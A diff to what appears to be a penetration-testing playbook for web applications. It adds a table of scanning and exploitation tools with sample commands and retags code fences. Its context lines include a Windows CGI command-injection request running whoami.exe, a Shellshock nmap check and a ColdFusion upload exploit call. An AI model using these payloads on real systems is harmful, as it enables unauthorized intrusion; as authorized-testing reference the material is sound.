@@ -8,6 +8,21 @@ Per-application playbook for the most common web apps and services encountered d
 
 ---
 
+## Tools
+
+| Tool | Purpose |
+|---|---|
+| `nmap` | Service discovery and version detection |
+| `eyewitness` | Screenshot all web services — `eyewitness --web -f targets.txt --no-prompt` |
+| `whatweb` / `httpx` | Technology fingerprinting — `whatweb http://target` / `httpx -l hosts.txt -tech-detect -title` |
+| `wpscan` | WordPress enumeration and vuln scanning — `wpscan --url http://target -e ap,u` |
+| `droopescan` | Drupal/Joomla/SilverStripe scanning — `droopescan scan drupal -u http://target` |
+| `joomscan` | Joomla-specific scanner — `joomscan -u http://target` |
+| `searchsploit` | Find known exploits for identified app versions |
+| `Metasploit` | Exploit modules for Tomcat, Jenkins, Splunk, Exchange, and others |
+
+---
+
 ## Application Categories
 
 | Category | Common Apps |
@@ -551,7 +566,7 @@ nmap --script http-shellshock --script-args uri=/cgi-bin/status target.com
 
 **Command injection (Windows — CGI parameter):**
 
-```
+```http
 GET /cgi-bin/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe HTTP/1.1
 ```
 
@@ -650,7 +665,7 @@ python3 cfusion_upload.py http://target.com
 
 ### Methodology
 
-```
+```text
 1. Fingerprint → DIE to identify language/framework
 2. Static → strings, decompile (.NET: dnSpy, Java: JADX/JD-GUI, native: Ghidra)
 3. Dynamic → Procmon during login/action → find config files, reg keys, temp files
